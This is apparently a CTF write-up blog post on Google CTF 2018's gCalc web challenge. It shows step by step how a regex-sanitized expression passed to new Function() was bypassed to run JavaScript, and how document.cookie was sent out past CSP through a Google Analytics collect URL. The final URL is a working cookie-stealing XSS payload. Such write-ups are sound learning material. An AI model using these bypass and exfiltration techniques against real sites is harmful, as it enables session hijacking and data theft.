---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/
title: "Google CTF 2018 Quals Web Challenge - gCalc | Orange Tsai"
author: "Orange Tsai"
published: 2018-06-26T16:00:00.000Z
description: "gCalc is the web challenge in Google CTF 2018 quals and only 15 teams solved during 2 days’ competition! This challenge is a very interesting challenge that give me lots of fun. I love the challenge"
---

* * *

gCalc is the web challenge in Google CTF 2018 quals and only 15 teams solved during 2 days’ competition!

This challenge is a very interesting challenge that give me lots of fun. I love the challenge that challenged your exploit skill instead of giving you lots of code to find a simple vulnerability or guessing without any hint. So that I want to write a writeup to note this :P

The challenge gave you a link [https://gcalc2.web.ctfcompetition.com/](https://gcalc2.web.ctfcompetition.com/). It just a calculator written in JavaScript and seems like a XSS challenge. There is a `try it` hyperlink in the bottom and pass your formula expression to admin!

![](https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/36a653e2478602ad-01.png)

At first glance I found there are 2 parameter we can control from query string - `expr` and `vars`. It looks like:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>https://gcalc2.web.ctfcompetition.com/?expr=vars.pi*3&vars={"pi":3.14159,"ans":0}<br>``` |

You can define some variables in the context and use them in formula expression. But the variable only allowed `Number` type, and the `Object` type that created from `null`, that means there is no other methods and properties in the created `Object`. The prettified JavaScript code you can find out from [my gist](https://gist.github.com/orangetw/31fce265a3b6329839d82eb810b2bd11)!

As you can see, the real vulnerability is very straightforward. Argument `a` is `expr` in query string and argument `b` is `vars`. The `expr` just do some sanitizers and pass to `new Function()`. The `new Function()` is like `eval` in JavaScript!

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>``` | ```<br>function p(a, b) {<br>    a = String(a).toLowerCase();<br>    b = String(b);<br>    if (!/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/.test(a)) throw Error(a);<br>    b = JSON.parse(b, function(a, b) {<br>        if (b && "object" === typeof b && !Array.isArray(b)) return Object.assign(Object.create(null), b);<br>        if ("number" === typeof b) return b<br>    });<br>    return (new Function("vars", "return " + a))(b)<br>}<br>``` |

The sanitizer of `expr` looks like flexible. We use [regex101](https://regex101.com/) to analyse the regular expression. The regular expression allowed some operands and operators in expression, and the variable name must starts-with `vars`. The first thought in my head is that we can use `constructor.constructor(CODE)()` to execute arbitrary JavaScript. Then the remaining part is how to create the `CODE` payload.

Quickly, I wrote the first version of exploit like:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>``` | ```<br>// https://regex101.com/r/FLdJ7h/1<br>// alert(1) // Remove whitespaces by yourself<br>vars.pi.constructor.constructor(<br>  vars.pi.toString().constructor.fromCharCode(97)+<br>  vars.pi.toString().constructor.fromCharCode(108)+<br>  vars.pi.toString().constructor.fromCharCode(101)+<br>  vars.pi.toString().constructor.fromCharCode(114)+<br>  vars.pi.toString().constructor.fromCharCode(116)+<br>  vars.pi.toString().constructor.fromCharCode(40)+<br>  vars.pi.toString().constructor.fromCharCode(49)+<br>  vars.pi.toString().constructor.fromCharCode(41)<br>)()<br>``` |

I debug for an hour and got stuck by this exploit. I am curious about why this works in my console but fails to XSS. Finally, I find the root cause that there is a `toLowerCase` in the first line, so our `toString` and `fromCharCode` will fail… orz

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>function p(a, b) {<br>    a = String(a).toLowerCase();<br>    b = String(b);<br>    ...<br>``` |

After knowing this, I quickly wrote next version of exploit, retrieving the payload from key of `vars` map! In my payload, I use `/1/.exec(1).keys(1).constructor` to get the `Obejct` constructor and `keys(vars).pop()` to retrieve the last key in the `vars` map!

Here is the payload:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>// https://regex101.com/r/IMXgwR/1<br>(1).constructor.constructor(<br>  /1/.exec(1).keys(1).constructor.keys(vars).pop()<br>)()<br>``` |

And payload to pop an `alert(1)`:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>https://gcalc2.web.ctfcompetition.com/<br>?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()<br>&vars={"pi":3.14159,"ans":0,"alert(1)":0}<br>``` |

![](https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/8a3cc22deb94a1d6-02.png)

Does it finished? Not yet :(

Our goal is to steal cookies from admin, and we encountered CSP problem!

### [CSP of /](https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/\#CSP-of "CSP of /") CSP of `/`

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>Content-Security-Policy: default-src 'self'; child-src https://sandbox-gcalc2.web.ctfcompetition.com/<br>``` |

### [CSP of /static/calc.html](https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/\#CSP-of-static-calc-html "CSP of /static/calc.html") CSP of `/static/calc.html`

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>Content-Security-Policy: default-src 'self'; frame-ancestors https://gcalc2.web.ctfcompetition.com/; font-src https://fonts.gstatic.com; style-src 'self' https://*.googleapis.com 'unsafe-inline'; script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google-analytics.com https://*.googleapis.com 'unsafe-eval' https://www.googletagmanager.com; child-src https://www.google.com/recaptcha/; img-src https://www.google-analytics.com;<br>``` |

We can’t use redirection or load external resources to exfiltrate cookies. But I have noticed that `img-src https://www.google-analytics.com` in the CSP header and remembered long time ago, I read a [HackerOne report](https://hackerone.com/reports/199779) that using Google Analytics for data exfiltration! You can embed your data in the parameter `ea` of Google Analytics to outside, and we can see results from [Google Analytics console](https://analytics.google.com/)!

Here is the final exploit:

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>https://gcalc2.web.ctfcompetition.com/<br>?expr=(1).constructor.constructor(/1/.exec(1).keys(1).constructor.keys(vars).pop())()<br>&vars={"pi":3.14159,"ans":0, "x=document.createElement('img');x.src='https://www.google-analytics.com/collect<br>?v=1&tid=UA-00000000-1&cid=0000000000&t=event&ec=email&ea='+encodeURIComponent(document.cookie);document.querySelector('body').append(x)":0}<br>``` |

![](https://blog.orange.tw/posts/2018-06-google-ctf-2018-quals-web-gcalc/07f4d3561354d1ce-03.png)

Oh yeah. The flag is `CTF{1+1=alert}`!